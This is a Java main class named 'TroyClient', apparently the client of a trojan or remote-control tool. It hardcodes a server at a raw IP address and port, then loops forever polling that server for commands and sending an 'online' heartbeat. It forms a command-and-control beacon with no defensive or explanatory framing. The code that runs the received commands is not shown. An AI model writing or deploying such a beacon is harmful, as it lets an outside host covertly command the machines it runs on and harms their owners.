package ch.lebois.troyclient;

import ch.lebois.troyclient.main.CommandReciver;
import ch.lebois.troyclient.main.ConfigureInit;
import ch.lebois.troyclient.main.SystemVariables;

public class TroyClient {
    public static void main(String[] args) throws InterruptedException {

        ConfigureInit init = new ConfigureInit();
        init.configure("http://77.57.199.126:8080", "2.4");

        CommandReciver commandReciver = new CommandReciver(init.getWebHandler());
        while (true) {
            Thread.sleep(SystemVariables.REFRESHTIME);
            commandReciver.readCommands();
            SystemVariables.SENDER.send("online", "");
        }
    }
}
